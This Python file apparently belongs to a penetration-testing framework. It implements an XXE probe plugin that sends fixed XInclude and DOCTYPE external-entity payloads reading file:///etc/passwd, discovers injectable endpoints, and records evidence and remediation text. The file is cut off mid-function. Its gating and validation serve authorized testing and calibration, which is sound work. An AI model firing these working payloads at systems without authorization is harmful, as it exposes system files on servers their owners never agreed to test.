"""Fail-closed XInclude local-file-read confirmation.

The tool confirms one deliberately narrow XXE primitive: a form value is
embedded into server-built XML and processed with XInclude enabled.  Callers
cannot choose XML, a URI, headers, cookies, or an out-of-band destination.  The
only active payload and proof marker are server-owned constants, and a finding
requires a bounded four-request unsolved-to-solved proof.
"""

from __future__ import annotations

import hashlib
import re
from html import unescape
from typing import Any, Dict, Iterable, Optional, Tuple
from urllib.parse import urlencode, urljoin, urlsplit

import aiohttp

from plugin_interface import ToolPlugin
from tools._agentic_exploration_common import read_limited
from tools._probe_candidates import (
    RequestBudget,
    discover_candidates,
    injectable_fields,
    normalize_candidates,
    sweep,
)
from tools.web_authentication_probe import (
    ALLOWED_ENGAGEMENTS,
    MAX_RESPONSE_BYTES,
    _field_name,
    _http_target,
    _path_and_query,
    _relative_path,
    sanitize_evidence_text,
)


# #1650 — two delivery modes for the SAME fixed local-file read.
#   xinclude-form-file-read  : XInclude element in a urlencoded FORM FIELD that
#                              the server embeds into XML it builds.
#   doctype-entity-xml-body  : classic external general entity in a RAW XML BODY
#                              the caller posts directly.
# The form mode cannot reach an endpoint that parses a raw XML body (vulnlab
# VULN-19 `POST /admin/import-xml`, and most real XML intake endpoints), so the
# probe had no way to confirm the commonest shape of this class. Both modes use
# a server-owned constant payload and the same fixed /etc/passwd proof marker;
# neither accepts caller-supplied XML, a URI, or an out-of-band destination.
ALLOWED_MODES = {"xinclude-form-file-read", "doctype-entity-xml-body"}
XML_BODY_MODES = {"doctype-entity-xml-body"}
# #1648 — two-tier proof, mirroring web_ssti_probe.py.
#   runtime-evaluation : benign control lacks /etc/passwd, XInclude probe carries
#                        it. Two requests. Works on ANY application. THE DEFAULT.
#   lab-state-change   : brackets that pairing with the PortSwigger unsolved ->
#                        solved transition. Four requests. Calibration only.
# Before this, the lab transition was mandatory at BOTH layers, so a confirmed
# XXE on a customer application produced zero findings by construction.
ALLOWED_PROOF_LEVELS = {"runtime-evaluation", "lab-state-change"}
STATE_CHANGE_ENGAGEMENTS = {"lab", "ctf"}
# Parameters that only exist on the lab tier. Supplying any of them on the
# runtime tier is a hard rejection, not a silent ignore.
_STATE_CHANGE_PARAMETERS = {
    "statusPath",
    "unsolvedMarker",
    "solvedMarker",
}
RUNTIME_EXPECTED_STEP_LABELS = (
    "clean-form-baseline",
    "xinclude-file-read",
)
LAB_EXPECTED_STEP_LABELS = (
    "unsolved-baseline",
    *RUNTIME_EXPECTED_STEP_LABELS,
    "solved-confirmation",
)
EXPECTED_STEP_LABELS_BY_PROOF_LEVEL = {
    "runtime-evaluation": RUNTIME_EXPECTED_STEP_LABELS,
    "lab-state-change": LAB_EXPECTED_STEP_LABELS,
}
# Back-compat alias; equals the lab shape.
EXPECTED_STEP_LABELS = LAB_EXPECTED_STEP_LABELS
FIXED_XINCLUDE_PAYLOAD = (
    '<foo xmlns:xi="http://www.w3.org/2001/XInclude">'
    '<xi:include parse="text" href="file:///etc/passwd"/></foo>'
)
FIXED_DOCTYPE_PAYLOAD = (
    '<?xml version="1.0"?>'
    '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    "<r>&xxe;</r>"
)
FIXED_XML_CONTROL_BODY = '<?xml version="1.0"?><r>xasm-control</r>'
FIXED_FILE_URI = "file:///etc/passwd"
XML_CONTENT_TYPE = "application/xml"
PROOF_MARKER = "root:x:0:0"
MAX_FORM_VALUE_CHARS = 512
MAX_MARKER_CHARS = 512
MAX_ADDITIONAL_FIELDS = 7
# PortSwigger lab status pages are routinely just above the shared 10k
# authentication-evidence excerpt cap. XXE proof is retained in full and the
# backend independently rejects response bodies above 64k, so keep a narrower
# tool-owned 32k ceiling instead of treating a safe 10-12k page as truncation.
MAX_XXE_EVIDENCE_CHARS = 32_000

_SENSITIVE_FIELD = re.compile(
    r"(?:auth|csrf|token|session|cookie|pass(?:word|wd)?|secret|api[_-]?key)",
    re.I,
)
_URI_OR_XML = re.compile(r"(?:<|>|(?:[A-Za-z][A-Za-z0-9+.-]*):/{0,2})")


def response_contains_marker(body: str, marker: str) -> bool:
    return marker in body or marker in unescape(body)


def _bounded_plain_value(value: Any) -> Optional[str]:
    if not isinstance(value, str):
        return None
    if (
        len(value) > MAX_FORM_VALUE_CHARS
        or "\r" in value
        or "\n" in value
        or "\0" in value
        or _URI_OR_XML.search(value)
    ):
        return None
    return value


def _bounded_marker(value: Any) -> Optional[str]:
    marker = str(value or "")
    if (
        len(marker) < 3
        or len(marker) > MAX_MARKER_CHARS
        or "\r" in marker
        or "\n" in marker
        or "\0" in marker
    ):
        return None
    return marker


def _parse_status(parameters: Dict[str, Any], key: str) -> Tuple[Optional[int], str]:
    try:
        value = int(parameters[key])
    except (KeyError, TypeError, ValueError):
        return None, f"{key} must be an integer"
    if value < 200 or value > 599:
        return None, f"{key} must be between 200 and 599"
    return value, ""


def validate_probe_parameters(parameters: Dict[str, Any]) -> Tuple[bool, str]:
    target = _http_target(parameters.get("target") or parameters.get("url"))
    if not target:
        return False, "target must be a credential-free HTTP(S) base URL without query or fragment"
    if str(parameters.get("mode") or "").lower() not in ALLOWED_MODES:
        return False, "mode must be xinclude-form-file-read"
    if str(parameters.get("engagement") or "").lower() not in ALLOWED_ENGAGEMENTS:
        return False, "engagement must be aggressive, lab, or ctf"
    if parameters.get("allowUnsafeMethods") is not True:
        return False, "allowUnsafeMethods=true is required"

    # #1648 — tier resolution. No defaulting: an unrecognised value is rejected,
    # so a typo cannot silently downgrade or upgrade the assertions.
    proof_level = str(parameters.get("proofLevel") or "").lower()
    if proof_level not in ALLOWED_PROOF_LEVELS:
        return False, "proofLevel must be runtime-evaluation or lab-state-change"

    mode = str(parameters.get("mode") or "").lower()
    # #1650 — sink-naming fields are optional in DETECTOR form: when the caller
    # supplies discovered candidates (or asks the probe to find its own), the
    # probe locates the sink instead of being told where it is. The single-sink
    # VERIFIER form is preserved unchanged, so all existing calibration evidence
    # still reproduces.
    detector_form = bool(
        parameters.get("candidates")
        or parameters.get("forms")
        or parameters.get("endpoints")
        or parameters.get("discoverCandidates")
    )

    if not detector_form:
        if not _relative_path(parameters.get("endpointPath")):
            return False, (
                "endpointPath must be a bounded same-origin relative path "
                "(or supply candidates / discoverCandidates=true)"
            )

    if parameters.get("endpointPath") is not None and not _relative_path(
        parameters.get("endpointPath")
    ):
        return False, "endpointPath must be a bounded same-origin relative path"

    # The raw-XML-body delivery has no injectable form field — the whole body is
    # the server-owned payload — so the field contract applies to the form mode.
    if mode in XML_BODY_MODES:
        injection_field = ""
    elif detector_form and parameters.get("injectionField") is None:
        injection_field = ""
    else:
        injection_field = _field_name(parameters.get("injectionField"))
        if not injection_field or _SENSITIVE_FIELD.search(injection_field):
            return False, "injectionField must be a valid non-sensitive form-field name"
        if _bounded_plain_value(parameters.get("baselineValue")) is None:
            return False, (
                "baselineValue must be a bounded plain string without XML, URI, "
                "or control-line characters"
            )

    additional_fields = parameters.get("additionalFields")
    if additional_fields is None and (detector_form or mode in XML_BODY_MODES):
        additional_fields = {}
    if not isinstance(additional_fields, dict):
        return False, "additionalFields must be an object with at most seven string fields"
    if len(additional_fields) > MAX_ADDITIONAL_FIELDS:
        return False, "additionalFields must contain at most seven fields"
    for raw_name, raw_value in additional_fields.items():
        name = _field_name(raw_name)
        if (
            not name
            or name == injection_field
            or _SENSITIVE_FIELD.search(name)
        ):
            return False, (
                "additionalFields keys must be unique valid non-sensitive form-field names"
            )
        if _bounded_plain_value(raw_value) is None:
            return False, (
                "additionalFields values must be bounded plain strings without XML, "
                "URI, or control-line characters"
            )

    # #1647 — the expected status codes are CORROBORATION, not preconditions.
    # They are validated when supplied and simply absent otherwise: a
    # discovery-driven run cannot know the vulnerable response's status code in
    # advance (knowing it means you have already exploited the target), and the
    # decisive evidence is the file content, not the status line.
    for key in ("expectedBaselineStatus", "expectedProbeStatus"):
        if parameters.get(key) is None:
            continue
        status, reason = _parse_status(parameters, key)
        if status is None:
            return False, reason

    # #1648 — the runtime tier is the short path: no status page, no markers, no
    # state transition, because none of those exist on a real application.
    # Supplying lab-only fields here is a hard rejection rather than a silent
    # ignore, or a caller could believe a transition was proven when nothing
    # checked it.
    if proof_level == "runtime-evaluation":
        unexpected = sorted(_STATE_CHANGE_PARAMETERS.intersection(parameters))
        if unexpected:
            return False, f"{unexpected[0]} is only allowed for proofLevel=lab-state-change"
        return _validate_timeout(parameters)

    if str(parameters.get("engagement") or "").lower() not in STATE_CHANGE_ENGAGEMENTS:
        return False, "lab-state-change requires engagement lab or ctf"
    if not _relative_path(parameters.get("statusPath")):
        return False, "statusPath must be a bounded same-origin relative path"

    unsolved_marker = _bounded_marker(parameters.get("unsolvedMarker"))
    solved_marker = _bounded_marker(parameters.get("solvedMarker"))
    if unsolved_marker is None:
        return False, f"unsolvedMarker must contain 3 to {MAX_MARKER_CHARS} safe characters"
    if solved_marker is None:
        return False, f"solvedMarker must contain 3 to {MAX_MARKER_CHARS} safe characters"
    if unsolved_marker == solved_marker:
        return False, "unsolvedMarker and solvedMarker must be distinct"
    if unsolved_marker in solved_marker or solved_marker in unsolved_marker:
        return False, "unsolvedMarker and solvedMarker must not contain each other"

    return _validate_timeout(parameters)


def _validate_timeout(parameters: Dict[str, Any]) -> Tuple[bool, str]:
    try:
        timeout = int(parameters.get("timeoutSeconds") or 15)
    except (TypeError, ValueError):
        return False, "timeoutSeconds must be an integer"
    if timeout < 3 or timeout > 30:
        return False, "timeoutSeconds must be between 3 and 30"
    return True, ""


def build_form_bodies(
    injection_field: str,
    baseline_value: str,
    additional_fields: Dict[str, str],
) -> Tuple[str, str]:
    clean_fields = {injection_field: baseline_value, **additional_fields}
    attack_fields = {injection_field: FIXED_XINCLUDE_PAYLOAD, **additional_fields}
    return urlencode(clean_fields), urlencode(attack_fields)


def _xml_escape_name(name: str) -> str:
    """Element names are taken from discovered field names, so bound them hard."""
    cleaned = re.sub(r"[^A-Za-z0-9_.-]", "", str(name or ""))[:64]
    return cleaned if cleaned and not cleaned[0].isdigit() else ""


def build_xml_bodies(
    injection_field: str = "",
    baseline_value: str = "",
    additional_fields: Optional[Dict[str, str]] = None,
    root_element: str = "data",
) -> Tuple[str, str]:
    """#1650 — the raw-XML-body delivery.

    The entity reference has to sit INSIDE the element the application actually
    reads, or the document is rejected before any entity is expanded. The
    PortSwigger "exploiting XXE to retrieve files" lab is the worked example: it
    answers a bare `<r>&xxe;</r>` with
    `"Product ID could not be parsed from XML" [400]`, but reflects the entity
    when it appears in `<productId>`. The element NAMES come from the candidate's
    discovered fields; the root name is irrelevant (verified against that lab —
    `<data>` and `<stockCheck>` behave identically).

    With no discovered fields we fall back to the bare document, which is what an
    endpoint that simply parses and echoes the whole payload needs (vulnlab
    VULN-19 `POST /admin/import-xml`).

    Only the fixed entity declaration and the fixed file URI are payload; every
    element name and benign value comes from observed request structure. The
    caller can never supply XML.
    """
    fields: Dict[str, str] = dict(additional_fields or {})
    target_field = _xml_escape_name(injection_field)
    root = _xml_escape_name(root_element) or "data"

    if not target_field:
        return FIXED_XML_CONTROL_BODY, FIXED_DOCTYPE_PAYLOAD

    def _document(values: Dict[str, str], doctype: str = "") -> str:
        parts = []
        for raw_name, value in values.items():
            safe_name = _xml_escape_name(raw_name)
            if safe_name:
                parts.append(f"<{safe_name}>{value}</{safe_name}>")
        body = "".join(parts)
        return f'<?xml version="1.0" encoding="UTF-8"?>{doctype}<{root}>{body}</{root}>'

    ordered = {target_field: baseline_value or "1"}
    for name, value in fields.items():
        safe = _xml_escape_name(name)
        if safe and safe != target_field:
            ordered[safe] = str(value)

    control = _document(ordered)
    attack = _document(
        {**ordered, target_field: "&xxe;"},
        doctype=f'<!DOCTYPE {root} [<!ENTITY xxe SYSTEM "{FIXED_FILE_URI}">]>',
    )
    return control, attack


def build_bodies_for_mode(
    mode: str,
    injection_field: str,
    baseline_value: str,
    additional_fields: Dict[str, str],
) -> Tuple[str, str]:
    if mode in XML_BODY_MODES:
        return build_xml_bodies(injection_field, baseline_value, additional_fields)
    return build_form_bodies(injection_field, baseline_value, additional_fields)


def _request_transcript(
    method: str,
    url: str,
    body: str = "",
    content_type: str = "application/x-www-form-urlencoded",
) -> str:
    parsed = urlsplit(url)
    lines = [
        f"{method} {_path_and_query(url)} HTTP/1.1",
        f"Host: {parsed.netloc}",
        "User-Agent: xASM-Agentic-XXE-Probe/1.0",
        "Accept: text/html,application/xhtml+xml,text/plain",
    ]
    if method == "POST":
        lines.extend(
            [
                f"Content-Type: {content_type}",
                f"Content-Length: {len(body.encode('utf-8'))}",
            ]
        )
    return sanitize_evidence_text(
        "\r\n".join(lines) + "\r\n\r\n" + body,
        (),
        MAX_XXE_EVIDENCE_CHARS,
    )


def _response_transcript(
    response: Dict[str, Any],
    secret_values: Iterable[Any] = (),
) -> str:
    reason = str(response.get("reason") or "").replace("\r", "").replace("\n", "")[:100]
    lines = [f"HTTP/1.1 {int(response.get('status') or 0)} {reason}"]
    included_headers = {"content-type", "content-length", "cache-control"}
    for name, value in response.get("headers", {}).items():
        if str(name).lower() in included_headers:
            lines.append(f"{name}: {value}")
    return sanitize_evidence_text(
        "\r\n".join(lines) + "\r\n\r\n" + str(response.get("body") or ""),
        secret_values,
        MAX_XXE_EVIDENCE_CHARS,
    )


def build_http_evidence_step(
    label: str,
    method: str,
    url: str,
    body: str,
    response: Dict[str, Any],
    secret_values: Iterable[Any] = (),
    content_type: str = "application/x-www-form-urlencoded",
) -> Dict[str, Any]:
    request = _request_transcript(method, url, body, content_type)
    response_text = _response_transcript(response, secret_values)
    raw_body = str(response.get("body") or "")
    body_bytes = raw_body.encode("utf-8", errors="replace")
    evidence_truncated = (
        bool(response.get("truncated"))
        or len(response_text) > MAX_XXE_EVIDENCE_CHARS
        or len(raw_body) > MAX_XXE_EVIDENCE_CHARS
    )
    return {
        "label": label,
        "request": request,
        "requestSha256": hashlib.sha256(request.encode("utf-8")).hexdigest(),
        "response": response_text,
        "responseSha256": hashlib.sha256(response_text.encode("utf-8")).hexdigest(),
        "responseBodySha256": hashlib.sha256(body_bytes).hexdigest(),
        "responseStatus": int(response.get("status") or 0),
        "responseBodyLength": len(body_bytes),
        "responseExcerptTruncated": evidence_truncated,
    }


# #1650 — the two deliveries prove the same class (CWE-611 local file read) via
# different mechanisms, so the finding text has to say which one actually fired.
# Reporting a DOCTYPE external-entity read as "via XInclude" would send the
# reader to the wrong remediation.
_FINDING_COPY = {
    "xinclude-form-file-read": {
        "name": "Verified XXE Local File Read via XInclude",
        "description": (
            "A form value was embedded into server-built XML and processed with "
            "XInclude enabled, reflecting a marker from /etc/passwd."
        ),
        "remediation": (
            "Disable XInclude and external resource resolution in every XML parser, "
            "avoid constructing XML from untrusted form values, and apply strict "
            "allowlist validation before values reach XML processing."
        ),
    },
    "doctype-entity-xml-body": {
        "name": "Verified XXE Local File Read via External Entity",
        "description": (
            "An XML body posted to this endpoint was parsed with DTD loading and "
            "entity substitution enabled. A declared external entity resolved "
            "file:///etc/passwd and its contents were returned in the response."
        ),
        "remediation": (
            "Disable DTD loading and external entity resolution in every XML parser "
            "(for example libxml2's noent/dtdload, or setting the relevant "
            "FEATURE_SECURE_PROCESSING flags), and reject documents containing a "
            "DOCTYPE declaration on endpoints that do not need one."
        ),
    },
}


def build_nuclei_finding(target: str, verification: Dict[str, Any]) -> Dict[str, Any]:
    mode = str(verification.get("mode") or "xinclude-form-file-read")
    copy = _FINDING_COPY.get(mode, _FINDING_COPY["xinclude-form-file-read"])
    return {
        "template-id": "xasm-xinclude-local-file-read-verified",
        "matcher-name": "xinclude-etc-passwd-reflection",
        "type": "http",
        "host": target,
        "matched-at": str(verification.get("endpointUrl") or target),
        "info": {
            "name": copy["name"],
            "severity": "high",
            "description": copy["description"],
            "remediation": copy["remediation"],
            "classification": {"cwe-id": ["CWE-611"]},
        },
        "evidence": verification,
    }


class XxeProbeTool(ToolPlugin):
    @property
    def name(self) -> str:
        return "web:xxe_probe"

    @property
    def description(self) -> str:
        return (
            "Confirms one bounded XInclude local-file-read primitive using a fixed "
            "/etc/passwd payload, a clean form control, and an unsolved-to-solved proof."
        )

    @property
    def schema(self) -> Dict[str, Any]:
        state_change_fields = sorted(_STATE_CHANGE_PARAMETERS)
        return {
            "type": "object",
            "properties": {
                "target": {"type": "string", "description": "Authorized application base URL"},
                "url": {"type": "string", "description": "Alias for target"},
                "mode": {"type": "string", "enum": sorted(ALLOWED_MODES)},
                "proofLevel": {"type": "string", "enum": sorted(ALLOWED_PROOF_LEVELS)},
                # #1650 — the shared #1649 candidate contract. When supplied (or
                # when discoverCandidates is set) the sink-naming fields become
                # optional and the probe locates the sink itself.
                "candidates": {"type": "array", "items": {"type": "object"}},
                "forms": {"type": "array", "items": {"type": "object"}},
                "endpoints": {"type": "array", "items": {"type": "string"}},
                "urls": {"type": "array", "items": {"type": "string"}},
                "discoverCandidates": {"type": "boolean", "default": False},
                "maxCandidates": {"type": "integer", "minimum": 1, "maximum": 40},
                "maxDiscoveryPages": {"type": "integer", "minimum": 1, "maximum": 25},
                "maxRequests": {"type": "integer", "minimum": 2, "maximum": 240},
                "statusPath": {"type": "string"},
                "endpointPath": {"type": "string"},
                "injectionField": {"type": "string"},
                "baselineValue": {"type": "string", "maxLength": MAX_FORM_VALUE_CHARS},
                "additionalFields": {
                    "type": "object",
                    "maxProperties": MAX_ADDITIONAL_FIELDS,
                    "additionalProperties": {
                        "type": "string",
                        "maxLength": MAX_FORM_VALUE_CHARS,
                    },
                },
                "unsolvedMarker": {"type": "string", "minLength": 3, "maxLength": MAX_MARKER_CHARS},
                "solvedMarker": {"type": "string", "minLength": 3, "maxLength": MAX_MARKER_CHARS},
                "expectedBaselineStatus": {"type": "integer", "minimum": 200, "maximum": 599},
                "expectedProbeStatus": {"type": "integer", "minimum": 200, "maximum": 599},
                "engagement": {
                    "type": "string",
                    "enum": ["standard", *sorted(ALLOWED_ENGAGEMENTS)],
                },
                "allowUnsafeMethods": {"type": "boolean", "default": False},
                "timeoutSeconds": {"type": "integer", "minimum": 3, "maximum": 30},
            },
            # #1647 — `expectedBaselineStatus` / `expectedProbeStatus` moved out
            # of `required`. They are corroborating assertions, and requiring
            # them meant the caller had to already know the vulnerable response's
            # status code — which is only knowable after exploiting the target,
            # so no discovery-driven run could ever supply them.
            # #1648 — `required` now holds only the tier-INDEPENDENT fields. The
            # lab-only ones are conditionally required AND conditionally
            # forbidden by the allOf/if/then/else below, copied from
            # web_ssti_probe.py so the two probes declare the contract the same
            # way.
            # #1650 — `endpointPath` / `injectionField` / `baselineValue` /
            # `additionalFields` left `required`: the caller either names one
            # sink or supplies candidates / discoverCandidates, and requiring
            # them is what made this a verifier that could not find anything.
            "required": [
                "mode",
                "proofLevel",
                "engagement",
                "allowUnsafeMethods",
            ],
            "oneOf": [{"required": ["target"]}, {"required": ["url"]}],
            "allOf": [
                {
                    "if": {
                        "properties": {
                            "proofLevel": {"const": "lab-state-change"},
                        }
                    },
                    "then": {"required": state_change_fields},
                    "else": {
                        "not": {
                            "anyOf": [
                                {"required": [field]} for field in state_change_fields
                            ]
                        }
                    },
                }
            ],
        }

    @property
    def metadata(self) -> Dict[str, Any]:
        return {
            "category": "exploit-test",
            "phase": 4,
            "domain": ["web"],
            "input_type": ["url", "form", "workflow"],
            "output_type": ["findings", "xxe_proof"],
            "taxonomy_domain": ["web"],
            "lifecycle_phase": "exploit-test",
            "purpose_count": "single",
            "primary_purpose": "Confirm one XInclude local-file-read primitive",
            "secondary_purposes": [],
        }

    async def _request(
        self,
        session: aiohttp.ClientSession,
        method: str,
        url: str,
        body: Optional[str] = None,
        content_type: str = "application/x-www-form-urlencoded",
    ) -> Dict[str, Any]:
        headers = {
            "User-Agent": "xASM-Agentic-XXE-Probe/1.0",
            "Accept": "text/html,application/xhtml+xml,text/plain",
        }
        if method == "POST":
            headers["Content-Type"] = content_type
        async with session.request(
            method,
            url,
            headers=headers,
            data=body if method == "POST" else None,
            allow_redirects=False,
        ) as response:
            raw = await read_limited(response.content, MAX_RESPONSE_BYTES + 1)
            truncated = len(raw) > MAX_RESPONSE_BYTES
            raw = raw[:MAX_RESPONSE_BYTES]
            return {
                "status": response.status,
                "reason": str(response.reason or "")[:100],
                "headers": response.headers,
                "body": raw.decode("utf-8", errors="replace").replace("\0", ""),
                "truncated": truncated,
            }

    @staticmethod
    def _response_is_bounded(response: Dict[str, Any]) -> bool:
        return (
            not response.get("truncated")
            and len(str(response.get("body") or "")) <= MAX_XXE_EVIDENCE_CHARS
            and len(_response_transcript(response)) <= MAX_XXE_EVIDENCE_CHARS
        )

    @staticmethod
    def _as_probe_candidate(candidate: Dict[str, Any], default_mode: str) -> Dict[str, Any]:
        """Project a shared #1649 candidate onto this probe's sink shape.

        Delivery is chosen from the candidate's observed content type: an
        endpoint that already accepts XML gets the raw-body DOCTYPE entity, a
        urlencoded form gets the XInclude form field. That is the whole reason
        the contract carries `contentType` — without it the probe has to guess.
        """
        content_type = str(candidate.get("contentType") or "").lower()
        fields = dict(candidate.get("fields") or {})
        names = injectable_fields(candidate)

        # #1650 — a candidate's HTML content type is a HINT, not the truth. The
        # PortSwigger "exploiting XXE to retrieve files" lab is the worked
        # example: its stock-check form declares no enctype (so it reads as
        # urlencoded) while `xmlStockCheckPayload.js` intercepts the submit and
        # posts XML. Inferring a single delivery from the markup picked the form
        # field, missed the raw-XML sink, and reported "no candidate fired" on a
        # target that was trivially vulnerable.
        #
        # So the delivery is a LIST to try in order, not a guess. Two deliveries
        # x two requests is still only four requests per candidate, inside the
        # shared budget, and mirrors how web_command_injection_timing_probe
        # iterates strategies per endpoint.
        if default_mode in XML_BODY_MODES:
            deliveries = ["doctype-entity-xml-body"]          # explicitly requested
        elif "xml" in content_type:
            deliveries = ["doctype-entity-xml-body"]          # unambiguous
        elif not names:
            deliveries = ["doctype-entity-xml-body"]          # no field to inject
        else:
            # Ambiguous: try the declared form delivery first, then the raw-XML
            # body in case the submit is JS-intercepted.
            deliveries = ["xinclude-form-file-read", "doctype-entity-xml-body"]

        injection_field = names[0] if names else ""
        baseline_value = str(fields.get(injection_field) or "1") if injection_field else ""
        additional = {
            name: str(value) for name, value in fields.items() if name != injection_field
        }
        return {
            "url": candidate["url"],
            "mode": deliveries[0],
            "deliveries": deliveries,
            "injectionField": injection_field,
            "baselineValue": baseline_value,
            "additionalFields": additional,
            "source": candidate.get("source") or "caller",
        }

    def _resolve_candidates(
        self,
        parameters: Dict[str, Any],
        target: str,
        mode: str,
    ) -> list:
        """Explicit single sink first (the unchanged verifier form), then the
        shared discovered-candidate contract."""
        endpoint_path = parameters.get("endpointPath")
        if endpoint_path:
            return [
                {
                    "url": urljoin(target, str(endpoint_path)),
                    "mode": mode,
                    "deliveries": [mode],
                    "injectionField": str(parameters.get("injectionField") or ""),
                    "baselineValue": str(parameters.get("baselineValue") or ""),
                    "additionalFields": {
                        str(key): str(value)
                        for key, value in dict(parameters.get("additionalFields") or {}).items()
                    },
                    "source": "caller",
                }
            ]
        return [
            self._as_probe_candidate(candidate, mode)
            for candidate in normalize_candidates(parameters, target)
        ]

    async def execute(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        # #1647 — a production-safe run must degrade to a clean no-op rather than
        # a validation error. The coordinator emits `engagement: 'standard'`
        # whenever the operator has not opted into aggressive/lab/ctf, and the
        # phase doRules already promise that "when engagement=standard these
        # tools return no-op/safe results so the phase still completes cleanly".
        # Returning an error instead made a standard-engagement phase look
        # broken. This does NOT widen what `standard` may execute — the probe
        # still sends nothing.
        if str(parameters.get("engagement") or "").lower() == "standard":
            return {
                "success": True,
                "fallback": False,
                "skipped": True,
                "reason": "engagement=standard: active XXE probing requires aggressive, lab, or ctf",
                "requestCount": 0,
                "findings": [],
            }

        valid, reason = validate_probe_parameters(parameters)
        if not valid:
            return {"success": False, "fallback": False, "error": reason, "findings": []}

        target = _http_target(parameters.get("target") or parameters.get("url"))
        assert target is not None
        proof_level = str(parameters["proofLevel"]).lower()
        is_lab = proof_level == "lab-state-change"
        mode = str(parameters["mode"]).lower()
        step_labels = EXPECTED_STEP_LABELS_BY_PROOF_LEVEL[proof_level]
        status_path = str(parameters["statusPath"]) if is_lab else ""
        status_url = urljoin(target, status_path) if is_lab else ""
        unsolved_marker = str(parameters["unsolvedMarker"]) if is_lab else ""
        solved_marker = str(parameters["solvedMarker"]) if is_lab else ""
        # #1647 — optional corroboration. `None` means "not asserted".
        expected_baseline_status = (
            int(parameters["expectedBaselineStatus"])
            if parameters.get("expectedBaselineStatus") is not None
            else None
        )
        expected_probe_status = (
            int(parameters["expectedProbeStatus"])
            if parameters.get("expectedProbeStatus") is not None
            else None
        )
        # Populated when a supplied expected status does not match what the
        # target actually returned. Recorded on the finding; never a veto.
        assertion_mismatches: list = []

        def _status_matches(label: str, expected, observed: int) -> bool:
            """Record (never raise) a status-code corroboration result."""
            if expected is None:
                return True
            if int(observed) == int(expected):
                return True
            assertion_mismatches.append(
                {"assertion": label, "expected": int(expected), "observed": int(observed)}
            )
            return False

        timeout = int(parameters.get("timeoutSeconds") or 15)

        request_count = 0
        status_checks = 0
        clean_requests = 0
        probe_requests = 0
        evidence_steps = []
        candidate_outcomes: list = []
        timeout_config = aiohttp.ClientTimeout(total=timeout, connect=min(timeout, 8))

        try:
            async with aiohttp.ClientSession(
                timeout=timeout_config,
                cookie_jar=aiohttp.DummyCookieJar(),
            ) as session:
                # #1650 — resolve the sinks to test. Precedence:
                #   1. an explicit single sink (the VERIFIER form, unchanged), so
                #      every existing calibration record still reproduces;
                #   2. caller-supplied discovered candidates (the shared #1649
                #      contract, which also accepts raw forms/urls/endpoints);
                #   3. the probe's own bounded same-origin discovery, so it works
                #      from a bare target with no routing at all.
                candidates = self._resolve_candidates(parameters, target, mode)
                if not candidates:
                    candidates = await discover_candidates(
                        session,
                        target,
                        max_pages=parameters.get("maxDiscoveryPages"),
                        max_candidates=parameters.get("maxCandidates"),
                    )
                    candidates = [
                        self._as_probe_candidate(candidate, mode) for candidate in candidates
                    ]
                if not candidates:
                    return {
                        "success": True,
                        "fallback": False,
                        "verified": False,
                        "skipped": True,
                        "coverageStatus": "INCOMPLETE",
                        "reason": "no same-origin injectable candidate was supplied or discovered",
                        "target": target,
                        "requestCount": 0,
                        "statusChecks": status_checks,
                        "cleanRequests": clean_requests,
                        "probeRequests": probe_requests,
                        "findings": [],
                    }

                baseline_status_matched = True
                # #1648 — the unsolved baseline exists only on the lab tier. A
                # real application has no such status page, and requiring one is
                # also why this probe could never re-confirm the same finding
                # twice: its very first request asserted an UNSOLVED state.
                if is_lab:
                    baseline = await self._request(session, "GET", status_url)
                    request_count += 1
                    status_checks += 1
                    baseline_status_matched = _status_matches(
                        "expectedBaselineStatus/unsolved-baseline",
                        expected_baseline_status,
                        baseline["status"],
                    )
                    if (
                        not self._response_is_bounded(baseline)
                        or not response_contains_marker(baseline["body"], unsolved_marker)
                        or response_contains_marker(baseline["body"], solved_marker)
                    ):
                        raise ValueError(
                            "clean status baseline did not prove the configured unsolved state"
                        )
                    evidence_steps.append(
                        build_http_evidence_step(
                            step_labels[0],
                            "GET",
                            status_url,
                            "",
                            baseline,
                        )
                    )

                budget = RequestBudget(parameters.get("maxRequests"))
                clean_status_matched = True
                probe_status_matched = True
                fired_candidate = None
                fired_steps: list = []
                sweep_incomplete = False

                async def _probe_candidate(candidate: Dict[str, Any]) -> Dict[str, Any]:
                    """Two requests: benign control, then the fixed payload.

                    MARKER ABSENT in the control and PRESENT in the probe is the
                    whole proof. A control that already leaks /etc/passwd cannot
                    attribute the disclosure to the payload, so that candidate is
                    reported as not-confirmed rather than raising — the sweep
                    moves on to the next sink.
                    """
                    nonlocal clean_status_matched, probe_status_matched
                    nonlocal fired_candidate, fired_steps
                    nonlocal sweep_incomplete
                    url = candidate["url"]
                    spent = 0
                    reasons = []

                    # #1650 — try each delivery for this candidate. A form whose
                    # submit is JS-intercepted looks urlencoded in the markup but
                    # accepts a raw XML body; guessing one delivery from the HTML
                    # misses exactly that case.
                    for candidate_mode in candidate.get("deliveries") or [candidate["mode"]]:
                        content_type = (
                            XML_CONTENT_TYPE
                            if candidate_mode in XML_BODY_MODES
                            else "application/x-www-form-urlencoded"
                        )
                        clean_body, attack_body = build_bodies_for_mode(
                            candidate_mode,
                            candidate["injectionField"],
                            candidate["baselineValue"],
                            candidate["additionalFields"],
                        )

                        clean = await self._request(session, "POST", url, clean_body, content_type)
                        spent += 1
                        if not self._response_is_bounded(clean):
                            sweep_incomplete = True
                            reasons.append(f"{candidate_mode}: control response was not bounded")
                            continue
                        if response_contains_marker(clean["body"], PROOF_MARKER):
                            sweep_incomplete = True
                            reasons.append(
                                f"{candidate_mode}: control already discloses the file marker"
                            )
                            continue

                        probe = await self._request(session, "POST", url, attack_body, content_type)
                        spent += 1
                        if not self._response_is_bounded(probe):
                            sweep_incomplete = True
                            reasons.append(f"{candidate_mode}: probe response was not bounded")
                            continue
                        if not response_contains_marker(probe["body"], PROOF_MARKER):
                            reasons.append(
                                f"{candidate_mode}: probe response did not carry the marker"
                            )
                            continue

                        # Confirmed — corroborate the statuses and keep the transcript.
                        clean_status_matched = _status_matches(
                            "expectedBaselineStatus/clean-form-baseline",
                            expected_baseline_status,
                            clean["status"],
                        )
                        probe_status_matched = _status_matches(
                            "expectedProbeStatus/xinclude-file-read",
                            expected_probe_status,
                            probe["status"],
                        )
                        fired_candidate = {**candidate, "mode": candidate_mode}
                        fired_steps = [
                            build_http_evidence_step(
                                "clean-form-baseline", "POST", url, clean_body, clean,
                                content_type=content_type,
                            ),
                            build_http_evidence_step(
                                "xinclude-file-read", "POST", url, attack_body, probe,
                                content_type=content_type,
                            ),
                        ]
